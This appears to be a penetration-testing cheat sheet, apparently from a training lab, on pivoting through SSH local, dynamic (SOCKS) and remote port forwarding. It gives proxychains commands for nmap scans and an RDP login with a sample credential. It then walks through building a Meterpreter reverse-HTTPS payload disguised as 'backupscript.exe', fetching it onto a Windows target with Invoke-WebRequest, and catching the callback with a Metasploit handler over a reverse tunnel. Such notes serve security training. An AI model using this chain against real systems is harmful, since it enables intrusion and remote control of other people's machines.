- [ ] Local Port Forwarding
- [ ] Dynamic Port Forwarding - SOCKS
- [ ] Remote Port Forwarding

Local Port Forwarding!!!
```sh
# single local port forwarding
ssh -L 1234:localhost:3306 ubuntu@10.129.44.235
# multiple local ports forwarding
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.44.235
```
Dynamic Port Forwarding  -  SOCKS!!!
```sh
ssh -D 9050 ubuntu@10.129.44.235
# proxychains.conf
echo 'socks4 127.0.0.1 9050' >> /etc/proxychains4.conf
# nmap over proxychain
proxychains nmap -v -sn 172.16.5.0/23
proxychains nmap -v -Pn -sT 172.16.5.19
# firefox
proxychains firefox
# xfreerdp
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
# msfconsole
proxychains msfconsole
search rdp_scanner
```
Remote - Reverse Port Forwarding!!!
```sh
# payload gen to connect to pivot
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ipPivot_int LPORT=8080 -f exe -o backupscript.exe

scp backupscript.exe ubuntu@ipPivot_ext:~/
# sending payload to the windows server
python3 -m http.server 8181
Invoke-WebRequest -Uri "http://ipPivot_int:8181/backupscript.exe" -OutFile "C:\backupscript.exe"
# SSH remote port forwarding | run on the attack box
ssh -R ipPivot_int:8080:0.0.0.0:8000 ubuntu@ipPivot_ext -vN
# meterpreter handler | listen on the attack box
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```
